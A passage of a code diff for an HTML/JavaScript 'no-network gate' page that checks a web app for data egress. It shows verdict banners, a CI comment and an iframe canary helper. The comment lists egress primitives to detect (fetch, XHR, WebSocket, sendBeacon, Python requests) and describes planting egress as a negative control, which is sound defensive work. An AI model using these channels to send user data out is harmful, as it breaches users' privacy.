+    staticRemoteHits: staticRemoteTotal, runtimeRemoteHits: runtimeRemoteTotal, pythonEgressHits: pyEgressTotal,
+    surfacesScanned: staticScanned, looseModules: uniqueModules, surfacesBooted: runtimeBooted, pyFiles: pyScanned, externalLinks: externalTotal,
+    note: 'no-network gate — ok requires: 0 remote egress (static, bundles+orchestrators+loose modules) + 0 cross-origin fired (runtime) + 0 outbound python client (static lens) + canary passed'
+  }; };
+
+  const v = document.getElementById('verdict');
+  if(!canaryOK){
+    v.style.borderColor='var(--bad)'; v.style.background='rgba(248,81,73,.08)';
+    v.innerHTML='<span class="lead">🚨</span> <b class="bad">GATE UNTRUSTWORTHY</b> — the negative control failed: a lens did not catch planted egress, so a green would be vacuous. Fix the detector first.';
+  } else if(ok){
+    v.style.borderColor='var(--ok)'; v.style.background='rgba(63,185,80,.08)';
+    v.innerHTML='<span class="lead">✅</span> <b class="ok">NO-NETWORK INVARIANT HOLDS</b> — 0 remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s) (static), 0 cross-origin fired ('+runtimeBooted+' booted), 0 outbound Python client ('+pyScanned+' files, static lens), and the negative control proved every lens catches planted egress. '+pill('canary','canary ✓');
+  } else {
+    v.style.borderColor='var(--bad)'; v.style.background='rgba(248,81,73,.08)';
+    v.innerHTML='<span class="lead">❌</span> <b class="bad">EGRESS DETECTED</b> — '+(staticOK?'':'static: '+staticRemoteTotal+' hit(s). ')+(runtimeOK?'':'runtime: '+runtimeRemoteTotal+' blocked. ')+(pythonOK?'':'python: '+pyEgressTotal+' outbound ref(s). ')+'See the tables above.';
+  }
+
+  document.getElementById('ci').textContent =
+`# CI: enforce the no-network invariant (the privacy analogue of verify-provenance).
+# Run headless (Playwright) on every PR; read window.__noNetworkOK (never scrape the DOM).
+#
+# SCOPE — the web-app surfaces a user opens: the 8 self-contained bundles (BUILD-MANIFEST.json)
+#   AND the 2 unbundled orchestrators (Data Unifier.html / OverDex.html) + their loose <script src>
+#   modules (adapters, DSPs, signal-orchestrate.js, the app JS), fetched and scanned too.
+# LAYER 1 (static) — grep each surface + module; classify by TARGET ORIGIN. FAIL on any
+#   remote/absolute-URL target or transport-only primitive (XHR/WebSocket/EventSource/sendBeacon).
+#   Relative / same-origin / data: / blob: loads are allowed; a remote <a href> is navigation.
+# LAYER 2 (runtime) — boot each surface in a trapped iframe (egress throws on a cross-origin
+#   target) and assert none fired.
+# LAYER 3 (python, static lens) — capture-host/*.py + requirements.txt: FAIL on an outbound HTTP
+#   client (requests/urllib/httpx/cloud SDK); bleak (BLE) / http.server (LAN-serve) / file I/O are
+#   local. NOT authoritative — a browser can't execute Python; add a Python/Node import-allowlist
+#   check in CI as the authoritative Python gate.
+# NEGATIVE CONTROL — plant egress in every lens (JS fetch/WS/beacon, remote <script src>, a remote
+#   <a href> that must read as nav, python requests.post) + benign locals; assert every plant is
+#   caught, no benign is flagged, and the runtime trap throws on remote while allowing local. A
+#   failed control HARD-FAILS the gate so a vacuous pass can never ship.
+#
+# Follow-up (its own dated brief): wire LAYER 1+2 as a group in tests/dex-tests.js (BOTH runners)
+# and the Python lens into tests/run-tests.mjs, so this rides the canonical gate.`;
+})();
+
+/* boot the runtime canary module in its own trapped iframe and read its self-tally */
+function readCanary(moduleHtml){
+  return new Promise((resolve)=>{
+    const ifr=document.createElement('iframe');
+    ifr.setAttribute('sandbox','allow-scripts allow-same-origin');
+    ifr.style.cssText='position:fixed;left:-9999px;top:-9999px;width:400px;height:300px;border:0';
+    let done=false;
+    const finish=()=>{ if(done) return; done=true; let c=null; try{ c=ifr.contentWindow&&ifr.contentWindow.__canary; }catch(_){ c=null; } try{ ifr.remove(); }catch(_){} resolve(c); };
+    ifr.addEventListener('load', ()=> setTimeout(finish, 400));
+    setTimeout(finish, 4000);
+    ifr.srcdoc = injectTrap(moduleHtml);
+    document.body.appendChild(ifr);
+  });
+}
+</script>
+</body></html>
